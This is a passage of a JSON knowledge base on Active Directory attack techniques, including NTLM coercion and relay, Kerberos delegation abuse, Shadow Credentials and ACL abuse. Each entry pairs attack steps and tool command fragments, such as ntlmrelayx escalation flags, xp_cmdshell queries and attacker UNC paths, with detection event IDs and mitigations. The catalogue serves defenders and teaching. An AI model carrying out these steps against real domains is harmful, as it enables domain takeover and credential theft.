Relay)","aka":"PrivExchange, cross-protocol HTTP relay","phase":"coercion","group":"Poisoning / Relay / Coercion","mitre":"T1557.001","cve":"CVE-2019-0724, CVE-2018-8581","sev":"High","summary":"Coerce the Exchange server's own high-privilege machine authentication via Exchange EWS PushSubscription and relay it to LDAP to grant DCSync rights over the domain.","how":"Registering an attacker URL in Exchange's pushSubscription causes Exchange$ to send HTTP NTLM authentication at SYSTEM-equivalent privilege. Relay this to LDAP with ntlmrelayx and abuse Exchange's default excessive rights (WriteDacl on domain) to grant DCSync to any user. Prereqs: unpatched Exchange and default excessive ACLs.","tools":"privexchange.py, ntlmrelayx.py -t ldap://dc --escalate-user, httpattack","detect":"LDAP writes by the Exchange machine account, domain-object ACL changes, anomalous EWS push subscription registrations.","events":"5136(ACL/DCSync権限付与), 4662, Exchange EWSログ","mitigate":"Apply Exchange Cumulative Updates, reduce Exchange's excessive rights (official mitigation script), enforce LDAP signing/EPA. CVE-2018-8581/2019-0724 patches."},{"name":"PetitPotam (MS-EFSRPC Coercion)","aka":"EfsRpcOpenFileRaw etc., CVE-2021-36942","phase":"coercion","group":"Poisoning / Relay / Coercion","mitre":"T1187","cve":"CVE-2021-36942","sev":"Critical","summary":"Coercion abusing the EfsRpc* functions of MS-EFSRPC (Encrypting File System Remote Protocol) to force machine authentication to an attacker UNC path from any host, including DCs.","how":"Pass a UNC (\\\\attacker\\share) to EfsRpcOpenFileRaw/EfsRpcEncryptFileSrv over \\pipe\\lsarpc etc. to make the target DC$ send its NTLM authentication to the attacker. Some versions succeeded without authentication (anonymously). Chain with ADCS ESC8 or LDAP relay for domain takeover. Prereqs: a reachable EFSRPC pipe, and relay-target signing/EPA not enforced.","tools":"PetitPotam.py, Coercer, dementor.py, ntlmrelayx","detect":"External EfsRpc calls to the lsarpc/efsrpc pipes, DC$ authenticating to a relay-target host, an immediately following certificate request.","events":"5145(名前付きパイプアクセス lsarpc/efsrpc), 4624(DC$のNTLM), 4886/4768(ADCS連結時)","mitigate":"CVE-2021-36942 patch; disable the EFS service if unneeded. Restrict NTLM on DC/CA and force Kerberos, require EPA/signing on relay targets (LDAP/ADCS). Block EFSRPC with RPC filters."},{"name":"PrinterBug / SpoolSample (MS-RPRN Coercion)","aka":"SpoolSample, RpcRemoteFindFirstPrinterChangeNotification","phase":"coercion","group":"Poisoning / Relay / Coercion","mitre":"T1187","cve":"","sev":"High","summary":"The original coercion: use MS-RPRN (Print Spooler RPC) RpcRemoteFindFirstPrinterChangeNotificationEx to make a target send authentication disguised as a printer change notification to the attacker.","how":"Run printerbug.py against a target with the Spooler service enabled (including DCs) to induce DC$ authentication to the attacker host. Relay the captured authentication to LDAP/ADCS/SMB, or send it to an unconstrained delegation host to seize a TGT (chained with Unconstrained Delegation attacks). Prereq: the Print Spooler service is running.","tools":"SpoolSample.exe, printerbug.py (dementor派生), Coercer, ntlmrelayx/rubeus monitor","detect":"External RpcRemoteFindFirstPrinterChangeNotification calls to the spoolss pipe, outbound DC$ authentication, unexpected RPC claiming to be the Spooler.","events":"5145(spoolssパイプ), 4624(マシンアカウントNTLM), Sysmon 3(異常な外向き接続)","mitigate":"Stop the Print Spooler service on DCs/critical servers (also common with PrintNightmare mitigation). Restrict MS-RPRN with RPC filters, restrict NTLM, enforce signing/EPA on relay targets."},{"name":"DFSCoerce (MS-DFSNM Coercion)","aka":"NetrDfsRemoveStdRoot/NetrDfsAddStdRoot","phase":"coercion","group":"Poisoning / Relay / Coercion","mitre":"T1187","cve":"","sev":"High","summary":"Coercion abusing MS-DFSNM (Distributed File System Namespace Management) RPC to force machine authentication from the DC. DFS often runs on DCs, making it hard to mitigate.","how":"Pass a UNC path to NetrDfsAddStdRoot/NetrDfsRemoveStdRoot on \\pipe\\netdfs to trigger DC$ authentication. Valuable as an alternative coercion that survives even where PetitPotam/PrinterBug are patched or disabled. Chain into ADCS/LDAP relay. Prereq: reachable DFS service (usually running on the DC).","tools":"dfscoerce.py, Coercer, ntlmrelayx","detect":"External NetrDfs* calls to the netdfs pipe; outbound authentication from DC$.","events":"5145(netdfsパイプ), 4624(DC$ NTLM)","mitigate":"Restrict MS-DFSNM to trusted sources via RPC filters, restrict NTLM on DCs, enforce EPA/signing on relay targets. Root fix is neutralizing the relay target (signing/EPA)."},{"name":"ShadowCoerce (MS-FSRVP Coercion)","aka":"IsPathSupported/IsPathShadowCopied","phase":"coercion","group":"Poisoning / Relay / Coercion","mitre":"T1187","cve":"","sev":"Medium","summary":"Coercion abusing MS-FSRVP (File Share Shadow Copy) RPC. Works on hosts where the File Server VSS Agent is enabled.","how":"Pass a UNC to IsPathSupported/IsPathShadowCopied on \\pipe\\FssagentRpc to trigger target authentication. Partially fixed in KB5015527, but re-exploitation has been reported. Used as a variant when other coercions are closed. Prereq: 'File Server VSS Agent Service' enabled.","tools":"shadowcoerce.py, Coercer, ntlmrelayx","detect":"External calls to the FssagentRpc pipe; outbound authentication from unexpected machines.","events":"5145(FssagentRpcパイプ), 4624","mitigate":"Disable 'File Server VSS Agent Service' if not needed, apply relevant patches, use RPC filters. Enforce signing/EPA on relay targets."},{"name":"Coercer (multi-vector coercion framework)","aka":"Coercer.py (covers EFSR/DFSNM/RPRN/FSRVP/EVEN/PAR, etc.)","phase":"coercion","group":"Poisoning / Relay / Coercion","mitre":"T1187","cve":"","sev":"High","summary":"Unified tool that automatically discovers and executes all known coercion protocols (MS-EFSR/RPRN/DFSNM/FSRVP/MS-EVEN/PAR and dozens of methods).","how":"Use Coercer scan mode to auto-enumerate coercion methods the target responds to, then coerce mode to force authentication en masse. Because it tries alternative pipes/functions comprehensively even when individual tools are blocked, a single patch cannot fully prevent it. Run alongside ntlmrelayx to relay to ADCS/LDAP.","tools":"Coercer scan/coerce -t <target> -l <attacker>, ntlmrelayx","detect":"Rapid successive access to multiple RPC pipes (lsarpc/efsrpc/netdfs/spoolss/FssagentRpc, etc.) in a short window; frequent outbound authentication from a target is a sign of automated scanning.","events":"5145(複数パイプ連続アクセス), 4624/4625多発","mitigate":"Root fix is neutralizing relay targets (SMB signing / LDAP signing + EPA / ADCS EPA) and a policy of eliminating NTLM entirely. Use RPC filters to restrict all coercion protocols at once; stop unneeded services."},{"name":"Drop the MIC (CVE-2019-1040)","aka":"MIC removal NTLM relay bypass","phase":"coercion","group":"Poisoning / Relay / Coercion","mitre":"T1557.001","cve":"CVE-2019-1040","sev":"Critical","summary":"Exploits a flaw where the DC accepts NTLM auth even after the MIC (Message Integrity Check) is stripped, bypassing signing requirements to enable cross-protocol relay such as SMB→LDAP.","how":"During relay, tamper with the MIC field and negotiate flags of NTLM_AUTHENTICATE so sessions that would require signing can still be relayed. Greatly raises the success rate of PetitPotam + LDAP relay. Implemented via ntlmrelayx --remove-mic. Prereq: DC/client unpatched for CVE-2019-1040.","tools":"ntlmrelayx.py --remove-mic, PetitPotam","detect":"NTLM auth missing the MIC; traces of cross-protocol relay (SMB-origin LDAP writes).","events":"4624(NTLM), 5136(RBCD/ACL変更)","mitigate":"Apply the June 2019+ cumulative update (CVE-2019-1040). Also enforce LDAP signing/channel binding and SMB signing."},{"name":"Drop the MIC 2 (CVE-2019-1166)","aka":"EPA/session bypass follow-up","phase":"coercion","group":"Poisoning / Relay / Coercion","mitre":"T1557.001","cve":"CVE-2019-1166","sev":"High","summary":"Follow-up vulnerability that bypasses MIC validation via MsvAvFlags manipulation, evading the CVE-2019-1040 fix. Slips past signing/EPA protections to complete a relay.","how":"Tamper with the NTLM AV_PAIR (MsvAvFlags) to drop the MIC-required bit, continuing signing-bypass relay under certain conditions even after patching. Used in ntlmrelayx-derived implementations. Prereq: relevant patch not applied.","tools":"ntlmrelayx (改造版), impacket","detect":"NTLM auth with tampered AV_PAIR; unexpected cross-protocol relay.","events":"4624(NTLM)","mitigate":"Apply CVE-2019-1166/CVE-2019-1338 patches; enforce LDAP/SMB signing + EPA to neutralize the relay itself."},{"name":"WebClient / WebDAV Coercion","aka":"HTTP auth coercion, PushSubscription/searchConnector, WebDAV activation","phase":"coercion","group":"Poisoning / Relay / Coercion","mitre":"T1187, T1557.001","cve":"","sev":"High","summary":"Starts the target's WebClient (WebDAV) service to force HTTP (NTLM) authentication. Since HTTP is unaffected by SMB signing, it creates an ideal path for cross-protocol relay such as ADCS ESC8.","how":"Use searchConnector-ms, .url/.lnk, or Coercer/PetitPotam with a UNC in WebDAV form (\\\\attacker@80\\path) to trigger WebClient startup. Without EPA, HTTP auth can be relayed to ADCS/HTTP free of signing constraints. On hosts where WebClient isn't running, trigger startup via change notify, etc. Prereq: WebClient service (present by default on Workstation).","tools":"Coercer (-web), PetitPotam (WebDAV), ntlmrelayx --adcs, WebClient起動用の.searchConnector","detect":"Unexpected startup of the WebClient service; outbound NTLM over WebDAV (HTTP) followed immediately by an ADCS certificate request.","events":"4624(HTTP NTLM), 4886/4887(ADCS), Sysmon 1(svchost WebClient起動)","mitigate":"Disable the WebClient service on hosts that don't need it (GPO). Enforce EPA on HTTP relay targets (ADCS/IIS). Restrict outbound WebDAV at the firewall."},{"name":"Kerberos Relay (KrbRelay)","aka":"Kerberos relaying, DNS/mDNS spoof for SPN","phase":"coercion","group":"Poisoning / Relay / Coercion","mitre":"T1557, T1550.003","cve":"","sev":"High","summary":"A newer attack that relays Kerberos rather than NTLM authentication. Uses DNS/mDNS poisoning to resolve an SPN to the attacker's name and forwards the AP-REQ to a target service.","how":"Manipulate IP/name resolution to make the victim obtain a ticket for HOST/attacker or an LDAP/DC SPN, then relay the captured AP-REQ to LDAP/SMB/ADCS, etc. Locally, KrbRelay relays to LSA to set RBCD/Shadow Credentials for SYSTEM escalation. Notable for working even in NTLM-disabled environments. Prereq: ability to manipulate SPN resolution; missing signing/binding on the target.","tools":"KrbRelay, KrbRelayUp, Rubeus, mitm6/Responder(SPN誘導)","detect":"Kerberos auth with a mismatch between SPN and actual host; TGS requests to unexpected principals; immediate local RBCD/KeyCredential configuration.","events":"4769(TGS要求), 5136(RBCD/KeyCredential), 4624","mitigate":"Enforcing LDAP signing + channel binding (EPA) is effective against Kerberos relay too. Counter name-resolution poisoning, require SMB signing, use Kerberos armoring (FAST), protect SPN resolution paths."},{"name":"KrbRelayUp (local privilege escalation)","aka":"Kerberos relay to LDAP RBCD local privesc","phase":"coercion","group":"Poisoning / Relay / Coercion","mitre":"T1557, T1078","cve":"","sev":"High","summary":"One-shot technique where an ordinary user on a domain-joined host combines Kerberos relay + RBCD to escalate to local SYSTEM.","how":"Capture the local machine account's authentication locally and relay it to LDAP, set RBCD on the target machine for an attacker-controlled account → obtain a service ticket for the target's CIFS/HOST SPN via S4U2self/proxy → execute as SYSTEM via SCM. Classic pattern requiring ms-DS-MachineAccountQuota>0.","tools":"KrbRelayUp, Rubeus, Whisker(KeyCredential版)","detect":"New computer creation by an ordinary user; RBCD set on the local host; S4U chaining; immediate service creation/SYSTEM execution.","events":"4741(コンピュータ作成), 5136(RBCD), 4769(S4U), 7045(サービス)","mitigate":"Set ms-DS-MachineAccountQuota=0, enforce LDAP signing + EPA, require LDAPS. Monitor RBCD attribute changes at endpoints; minimize admin privileges."},{"name":"NTLM Relay to MSSQL","aka":"ntlmrelayx MSSQL relay","phase":"coercion","group":"Poisoning / Relay / Coercion","mitre":"T1557.001","cve":"","sev":"Medium","summary":"A relay target that forwards captured NTLM auth to SQL Server to run commands (via xp_cmdshell, etc.) or exfiltrate data.","how":"Relay auth obtained via Responder/coercion to ntlmrelayx -t mssql://<sqlsrv>, then use -q to run queries or enable xp_cmdshell. Effective when the relayed account holds sysadmin/DB privileges. Prereq: SQL accepts Windows auth and is not protected by signing.","tools":"ntlmrelayx.py -t mssql://<host> -q 'exec xp_cmdshell ...'","detect":"Windows auth logon to SQL from an unexpected source; xp_cmdshell enablement; abnormal sp execution.","events":"SQL監査ログ, 4624, 18456(SQLログイン)","mitigate":"Enable Force Encryption/channel encryption and Extended Protection (EPA) on SQL, disable xp_cmdshell, apply least privilege. Counter name-resolution poisoning."},{"name":"Unconstrained Delegation + Coercion chain","aka":"Printerbug to Unconstrained Delegation, TGT capture","phase":"coercion","group":"Poisoning / Relay / Coercion","mitre":"T1187, T1558","cve":"","sev":"Critical","summary":"An attacker controls a host with unconstrained delegation and coerces DC$ authentication via PrinterBug, etc., to capture the DC's TGT in memory, leading to DCSync.","how":"Take over an unconstrained-delegation server (or an attacker-created delegation computer) and wait for a TGT with Rubeus monitor; coercing DC$ to Kerberos-authenticate to that host via PrinterBug/PetitPotam caches the DC's TGT via delegation, allowing extraction. Use the extracted TGT for DCSync → full domain compromise. Prereq: a controlled unconstrained-delegation host; a coercible DC.","tools":"Rubeus monitor/dump, SpoolSample/PetitPotam, mimikatz, secretsdump","detect":"DC$ authentication to an unconstrained-delegation host; abnormal inflow of delegation-flagged TGTs; immediate DCSync afterward.","events":"4768/4769(TGT/TGS), 4662(DCSync), 4624(DC$)","mitigate":"Eliminate unconstrained delegation entirely and migrate to constrained/RBCD; mark critical accounts like DCs as 'sensitive and cannot be delegated' (Protected Users/AccountNotDelegated). Stop Spooler, counter coercion."},{"name":"Unconstrained Delegation Abuse (TGT Theft)","aka":"Unconstrained Kerberos Delegation, TrustedForDelegation abuse","phase":"privesc","group":"Delegation","mitre":"T1550.003, T1187","cve":"","sev":"Critical","summary":"Steals the TGT that gets cached in memory when a user logs on/authenticates to a host configured for unconstrained delegation, then impersonates that user.","how":"Prereq: local admin on, or control of, a computer/service account with the TRUSTED_FOR_DELEGATION flag (userAccountControl) set. Steps: (1) Enumerate unconstrained-delegation hosts with PowerView or the Active Directory module (Get-DomainComputer -Unconstrained). (2) Make a high-privilege user authenticate to the target host (share access, printing, coerce). (3) Extract the cached TGT with Rubeus monitor / triage / dump, or mimikatz sekurlsa::tickets /export. (4) Reuse the extracted TGT via PTT (Pass-the-Ticket) for DCSync, etc. To target a DC's machine account TGT, coerce DC$ authentication with PrinterBug (MS-RPRN SpoolSample) or PetitPotam (MS-EFSRPC).","tools":"Rubeus (monitor/dump/asktgt), mimikatz (sekurlsa::tickets), PowerView (Get-DomainComputer -Unconstrained), SpoolSample/printerbug.py, PetitPotam/Coercer, impacket (secretsdump)","detect":"Periodically inventory non-DC accounts with unconstrained delegation set (userAccountControl & 0x80000). Monitor for abnormal coerced SMB/RPC authentication to DCs (EFSRPC, MS-RPRN) or for large numbers of TGTs observed on hosts where TGT delegation normally doesn't occur. Correlate spikes in Events 4768/4769 and atypical authentication from delegation hosts to DCs.","events":"4768 (TGT要求), 4769 (サービスチケット要求), 4624 (ログオン), 5145 (共有アクセス/spoolss,efsrpc pipe)","mitigate":"Add critical accounts (admins) to the 'Protected Users' group to exclude them from delegation. Set the account attribute 'Account is sensitive and cannot be delegated' (NOT_DELEGATED). Deprecate unconstrained delegation in principle and migrate to RBCD. As DC PrinterBug mitigation, stop the Spooler service; mitigate PetitPotam (EFS patch / Extended Protection for Authentication)."},{"name":"Constrained Delegation Abuse (S4U2Self / S4U2Proxy)","aka":"KCD abuse, msDS-AllowedToDelegateTo abuse","phase":"privesc","group":"Delegation","mitre":"T1558, T1550.003","cve":"","sev":"High","summary":"Takes control of an account holding constrained delegation (msDS-AllowedToDelegateTo) and uses S4U2Self+S4U2Proxy to impersonate any user and access the permitted services.","how":"Prereq: credentials (password/NT/AES key) or TGT of a service account/computer with msDS-AllowedToDelegateTo set. Steps: (1) Enumerate delegation accounts (Get-DomainUser/Computer -TrustedToAuth). (2) Obtain that account's TGT. (3) Use S4U2Self to get a service ticket to itself for an arbitrary user (e.g., Administrator). (4) Use S4U2Proxy to get a ticket for the SPN listed in msDS-AllowedToDelegateTo. If protocol transition (TRUSTED_TO_AUTH_FOR_DELEGATION) is enabled, any user can be impersonated without initial authentication. Rewrite the SPN's sname (alternate service name / sname trick) to pivot to another service on the same host (e.g., cifs to ldap or host), expanding to DCSync or remote execution.","tools":"Rubeus s4u (/impersonateuser /msdsspn /altservice), impacket getST.py (-spn -impersonate), kekeo tgs::s4u, mimikatz","detect":"Monitor 4769 events carrying the Transited Services attribute as a trace of S4U2Proxy. Correlate frequent S4U despite protocol transition being unset, or access to an sname different from the delegated SPN. Detect abnormal service-ticket request patterns from delegation accounts. Track (audit) changes to msDS-AllowedToDelegateTo.","events":"4769 (Transited Services フィールドあり), 4624, 4770, 4738 (アカウント属性変更)","mitigate":"Disable protocol transition (TRUSTED_TO_AUTH_FOR_DELEGATION) wherever possible and avoid constrained delegation with protocol transition. Use long passwords / gMSA for delegation service accounts. Register privileged accounts in Protected Users and set 'cannot be delegated'. Minimize delegated SPNs. As an altservice-trick countermeasure, limit delegation to only genuinely required services."},{"name":"Resource-Based Constrained Delegation (RBCD)","aka":"RBCD attack, msDS-AllowedToActOnBehalfOfOtherIdentity abuse","phase":"privesc","group":"Delegation","mitre":"T1098, T1550.003","cve":"","sev":"Critical","summary":"Writes an attacker-controlled account into the target computer's msDS-AllowedToActOnBehalfOfOtherIdentity attribute and uses S4U to impersonate any user (admin) on the target host.","how":"Prereq: write permissions on the target computer object (GenericWrite/GenericAll/WriteProperty/WriteDACL, etc.) plus a controlled account with an SPN (an existing computer account, or a self-created one using MachineAccountQuota>0). Steps: (1) Create a new machine account with addcomputer.py / PowerMad (New-MachineAccount) (default MAQ=10). (2) Set the self-created account's SID into the target's msDS-AllowedToActOnBehalfOfOtherIdentity via rbcd.py or PowerView Set-ADComputer -PrincipalsAllowedToDelegateToAccount. (3) Run S4U2Self+S4U2Proxy from the created account's TGT via Rubeus s4u / getST.py to obtain admin-impersonation tickets for the target host's cifs/host/ldap. (4) Compromise via PsExec/DCSync. Setting the attribute by coercing the ACL (writing to LDAP via NTLM relay) is also mainstream (PetitPotam + ntlmrelayx --delegate-access).","tools":"impacket (addcomputer.py, rbcd.py, getST.py, ntlmrelayx --delegate-access), PowerMad, PowerView (Set-ADComputer/Get-DomainComputer), Rubeus s4u, StandIn","detect":"Monitor changes to the msDS-AllowedToActOnBehalfOfOtherIdentity attribute (4662 / directory change auditing). Track new computer account creation via MachineAccountQuota (4741) and correlate S4U ticket requests (4769 Transited Services) from suspicious, non-existing machine accounts. Detect the sequence of account creation → attribute write → S4U in a short window.","events":"4741 (コンピュータアカウント作成), 4742 (コンピュータアカウント変更), 4662 (オブジェクト属性変更), 4769 (Transited Services)","mitigate":"Set ms-DS-MachineAccountQuota to 0 to prohibit machine account creation by ordinary users. Review computer object DACLs and remove unnecessary write permissions. Register privileged accounts in Protected Users / 'cannot be delegated'. Apply NTLM relay countermeasures (SMB signing, LDAP signing/channel binding, EPA). Turn writes to msDS-AllowedToActOnBehalfOfOtherIdentity into audit alerts."},{"name":"Shadow Credentials (msDS-KeyCredentialLink / PKINIT)","aka":"Whisker attack, Key Trust abuse, ShadowCreds","phase":"privesc","group":"Delegation","mitre":"T1098, T1649, T1556","cve":"","sev":"Critical","summary":"Add an attacker-controlled public key (certificate) to the target account's msDS-KeyCredentialLink attribute, then authenticate as that account via PKINIT (certificate-based Kerberos) to obtain a TGT/NTLM hash.","how":"Prereq: write access to msDS-KeyCredentialLink on the target user/computer object (GenericWrite/GenericAll/WriteProperty). Requires a PKINIT-capable KDC (certificate on DC, Windows Server 2016+ / Key Trust). Steps: (1) Add a KeyCredential (attacker-generated key pair) to the target's msDS-KeyCredentialLink with Whisker add or pyWhisker. (2) Authenticate via PKINIT and get a TGT with Rubeus asktgt /certificate or gettgtpkinit.py. (3) Recover the target's NT hash with getnthash / Rubeus /getcredentials (U2U) and pivot to PTH or DCSync. A common chain first obtains write access via ACL coercion (as in RBCD/ESC). Used for privilege escalation and persistence from low privilege.","tools":"Whisker (add/list/clear), pyWhisker, Rubeus (asktgt /certificate /getcredentials), Certipy shadow auto, gettgtpkinit.py (PKINITtools), ntpwdextract","detect":"Monitor changes to msDS-KeyCredentialLink (4662 / directory service change 5136) — it normally changes only via Windows Hello for Business/device registration. Track PKINIT authentications (4768 with certificate info fields, pre-auth type 16 / PA-PK-AS-REQ). Correlate the sequence of attribute write followed immediately by a PKINIT TGT request. Baseline against existing legitimate KeyCredentials for diffing.","events":"5136 (ディレクトリオブジェクト変更), 4662 (属性アクセス), 4768 (証明書/PKINITによるTGT), 4769","mitigate":"Minimize object DACLs and remove unnecessary write access to msDS-KeyCredentialLink. Add privileged accounts to Protected Users. In environments not using Windows Hello for Business, consider disabling Key Trust/PKINIT. Turn attribute changes into audit rules with SOC alerts. Also harden the ADCS/PKI path (ESC mitigations). Periodically inventory KeyCredentialLink."},{"name":"Delegation via NTLM Relay to LDAP (Coerce + Relay RBCD/Shadow)","aka":"PetitPotam relay, DFSCoerce/Coercer + ntlmrelayx delegation","phase":"privesc","group":"Delegation","mitre":"T1557.001","cve":"CVE-2021-36942","sev":"Critical","summary":"A compound attack that uses coercion to elicit a machine account's NTLM authentication, relays it to LDAP(S), and writes RBCD attributes or Shadow Credentials to establish a delegation path.","how":"Prereq: LDAP signing/channel binding not enforced at the relay target, a context on the victim computer sufficient for LDAP writes, and a coercible RPC interface. Steps: (1) Listen with ntlmrelayx.py -t ldaps://DC --delegate-access. (2) Coerce the target machine account to authenticate to the relay target via PetitPotam (MS-EFSRPC) / PrinterBug (MS-RPRN) / DFSCoerce (MS-DFSNM) / Coercer. (3) Using the relayed authentication, ntlmrelayx creates a new machine account + sets the target's msDS-AllowedToActOnBehalfOfOtherIdentity (RBCD), or sets msDS-KeyCredentialLink with --shadow-credentials. (4) Obtain an impersonation ticket with getST.py/Rubeus and compromise the host. In some cases the DC itself is relayed, leading to DC compromise.","tools":"impacket ntlmrelayx.py (--delegate-access/--shadow-credentials), PetitPotam, printerbug.py, dfscoerce.py, Coercer, addcomputer.py","detect":"Monitor coercion RPC calls (EFSRPC, MS-RPRN spoolss, MS-DFSNM) via named pipe access 5145. Detect anomalous LDAP writes (4662/5136) where a machine account modifies attributes (RBCD/KeyCredentialLink) on objects other than itself. Correlate paths where NTLM authentication reaches LDAP(S), and mismatches between the authenticating source and the operating source IP.","events":"5145 (efsrpc/spoolss/netdfs pipe), 4662, 5136, 4741, 4624 (NTLM Type3)","mitigate":"Enforce LDAP signing + LDAPS channel binding (EPA). Require SMB signing. Disable unneeded EFSRPC/Spooler/DFSNM interfaces and apply patches. Set MachineAccountQuota=0. Enable Extended Protection for Authentication. Audit-alert on RBCD/KeyCredentialLink attribute changes. Restrict unnecessary RPC coercion paths between DCs and to DCs with firewalls."},{"name":"S4U2Self Alternate Service Name (sname) Substitution","aka":"Kerberos alternate service class trick, altservice abuse","phase":"privesc","group":"Delegation","mitre":"T1558, T1550.003","cve":"","sev":"High","summary":"A variant that rewrites the service class (sname) portion of a service ticket obtained via S4U delegation to laterally reach a different, non-delegated service (e.g., HOST→LDAP/CIFS).","how":"Prereq: constrained delegation or RBCD already established, allowing an S4U2Proxy ticket for some SPN. Steps: exploits the implementation behavior that although the KDC binds the sname when encrypting/validating the service ticket, the service class portion is not strictly validated by the service for the same host (same account). (1) Obtain an S4U2Proxy ticket for a delegation-allowed SPN (e.g., TIME/host or HTTP/host). (2) Rewrite the ticket's sname with Rubeus /altservice:cifs,host,ldap,http. (3) Use the rewritten ticket to access CIFS (files/PsExec) or LDAP (DCSync). This escalates delegation over a seemingly harmless SPN into full compromise.","tools":"Rubeus s4u /altservice, impacket getST.py -altservice, kekeo","detect":"Correlate mismatches between the service name in 4769 and the service type actually accessed. Detect patterns where a single delegation account accesses multiple service classes (cifs/ldap/host/http) in a short window. Focus monitoring on access to services that shouldn't be in the delegation set (especially ldap = precursor to DCSync).","events":"4769, 4662 (DCSync時のReplication権限アクセス), 4624","mitigate":"Limit constrained delegation target SPNs to only what is truly needed (avoid carelessly including ldap/host/cifs). Avoid protocol transition. Put privileged accounts in Protected Users / mark as not delegatable. Retire RBCD or delegation itself where possible. Pair with DCSync detection (anomalous replication)."},{"name":"Computer Account Takeover via Delegation + U2U getcredentials","aka":"PKINIT UnPAC-the-hash, U2U NTLM extraction","phase":"privesc","group":"Delegation","mitre":"T1550.002","cve":"","sev":"High","summary":"A variant that extracts an account's NTLM hash without a plaintext password, using User-to-User (U2U) + PAC decryption from a TGT obtained via Shadow Credentials or PKINIT.","how":"Prereq: successful PKINIT authentication for the target account (TGT already obtained via Shadow Credentials, etc.). Steps: (1) Use Rubeus asktgt /certificate /getcredentials or gettgtpkinit.py + getnthash.py. (2) Leverage the mechanism where, on PKINIT, the KDC returns PAC_CREDENTIAL_INFO (containing the NTLM hash) encrypted (UnPAC-the-hash), and decrypt it with the TGT session key to obtain the NT hash. (3) Use the hash for Pass-the-Hash/Overpass-the-Hash, DCSync, and persistence. Done against a machine account, it leads directly to full control of that host.","tools":"Rubeus (asktgt /getcredentials), PKINITtools (gettgtpkinit.py, getnthash.py), Certipy (auth), Whisker連携","detect":"Alert when a PKINIT TGT request (4768, PA-PK-AS-REQ, with certificate info) is observed for an account that normally does not use certificate authentication. Correlate the consecutive sequence of Shadow Credentials setup (5136 KeyCredentialLink) and PKINIT authentication. Track subsequent NTLM (PTH) usage.","events":"4768 (証明書/PKINIT), 5136, 4769, 4624 (NTLM Type3)","mitigate":"Build on Shadow Credentials mitigations (minimize/audit msDS-KeyCredentialLink DACLs) and disable PKINIT/Key Trust in environments that don't need them. Use Protected Users to restrict delegation/PKINIT abuse of privileged accounts. Suppress and audit NTLM overall. Periodically inventory KeyCredentialLink."},{"name":"GenericAll (Full Control)","aka":"Full Control ACE / RIGHT_DS_CONTROL_ACCESS + full rights","phase":"privesc","group":"ACL / Object Permissions","mitre":"T1222.001, T1098","cve":"","sev":"Critical","summary":"Full control over the target object. The strongest pivot edge across users/groups/computers/OUs.","how":"Branches into arbitrary follow-on attacks depending on the object GenericAll is held over. For a user: ForceChangePassword / Shadow Credentials / Targeted Kerberoast; for a computer: RBCD / Shadow Credentials; for a group: AddMember; for the domain object: WriteDacl to grant DCSync rights. Shown as a GenericAll edge in BloodHound; verify and abuse with `Get-ObjectAcl` / `dacledit.py`.","tools":"PowerView (Add-DomainGroupMember, Set-DomainUserPassword), BloodHound, impacket (dacledit.py, ntlmrelayx), Rubeus, Whisker/pyWhisker","detect":"Monitor privilege exercise with GUIDs via Security 4662 (An operation was performed on an object). Correlate ACL changes (4670), group changes (4728/4732/4756), and forced password change (4724). Detect broad BloodHound-style GenericAll grants themselves via periodic inventory.","events":"4662, 4670, 4724, 4728/4732/4756, 5136","mitigate":"Remove unnecessary GenericAll ACEs and apply least privilege. Audit ACEs on Tier0 objects and enable 4662 via SACL. For protected accounts under AdminSDHolder, break inheritance and reset the ACL."},{"name":"GenericWrite","aka":"Generic Write ACE / RIGHT_DS_WRITE_PROP (all properties)","phase":"privesc","group":"ACL / Object Permissions","mitre":"T1222.001, T1098, T1558.003","cve":"","sev":"Critical","summary":"Write access to (nearly) all attributes of the target. Leads to takeover by rewriting SPN / msDS-KeyCredentialLink / scriptPath, etc.","how":"For a user target: write servicePrincipalName for Targeted Kerberoasting, write msDS-KeyCredentialLink for Shadow Credentials, or rewrite scriptPath/logon script for code execution. For a computer target: write msDS-AllowedToActOnBehalfOfOtherIdentity for RBCD. A group's member is usually included in GenericWrite, enabling AddMember.","tools":"PowerView (Set-DomainObject), Rubeus, Whisker/pyWhisker, targetedKerberoast.py, impacket (rbcd.py, addspn.py)","detect":"Monitor writes to target GUIDs (msDS-KeyCredentialLink=5b47d60f..., servicePrincipalName, etc.) via 4662. Capture changes to SPN or msDS-KeyCredentialLink attributes via 5136 (directory object change). Correlate anomalous SPN additions with subsequent Kerberos 4769.","events":"4662, 5136, 4769, 4738","mitigate":"Inventory and remove GenericWrite ACEs. Enable SACL auditing of msDS-KeyCredentialLink changes to detect Shadow Credentials. Restrict SPN additions; put sensitive accounts in protected groups and break inheritance via AdminSDHolder."},{"name":"WriteDACL","aka":"WriteDacl / WRITE_DAC","phase":"privesc","group":"ACL / Object Permissions","mitre":"T1222.001, T1098","cve":"","sev":"Critical","summary":"Rights to rewrite the target's DACL. Escalate to other attacks by granting yourself arbitrary ACEs (e.g., GenericAll).","how":"With WriteDacl, append a GenericAll ACE for yourself or replication-rights ACEs for DCSync to the target object's DACL. Done against the domain root, grant DS-Replication-Get-Changes/-All to enable DCSync. Operate with `dacledit.py` or PowerView `Add-DomainObjectAcl`.","tools":"PowerView (Add-DomainObjectAcl), impacket dacledit.py, BloodHound, ntlmrelayx.py (-–escalate-user)","detect":"Monitor nTSecurityDescriptor attribute changes via 5136, especially DACL additions to domain objects or AdminSDHolder. Confirm write access via 4662. Correlate subsequent DCSync using the granted replication rights (4662 GUID 1131f6aa/1131f6ad).","events":"5136, 4662, 4670","mitigate":"Remove WriteDacl ACEs and periodically inventory owners/ACLs. Enable SACL auditing on the domain object/AdminSDHolder. Set alerts on ACL changes to critical objects."},{"name":"WriteOwner","aka":"Owns / WriteOwner / WRITE_OWNER","phase":"privesc","group":"ACL / Object Permissions","mitre":"T1222.001, T1098","cve":"","sev":"High","summary":"Change the target's owner to yourself. Since the owner can implicitly rewrite the DACL, this escalates to the equivalent of WriteDacl.","how":"With WriteOwner, change the target object's owner to yourself (or a controlled account), then use owner rights to perform WriteDacl and grant yourself GenericAll. From there, branch into all GenericAll-family attacks. Operate in the order `owneredit.py` → `dacledit.py`.","tools":"PowerView (Set-DomainObjectOwner), impacket owneredit.py/dacledit.py, BloodHound (Owns/WriteOwnerエッジ)","detect":"Monitor nTSecurityDescriptor (owner) changes via 5136 and detect WRITE_OWNER access via 4662. Detect the anomaly of an owner changing from the default (Domain Admins/Enterprise Admins) to an individual account.","events":"5136, 4662","mitigate":"Standardize ownership of critical objects to administrative groups and audit. Remove WriteOwner ACEs. Alert on owner changes in the SIEM, and periodically remediate protected-account ACLs via AdminSDHolder."},{"name":"AddMember (Group Membership 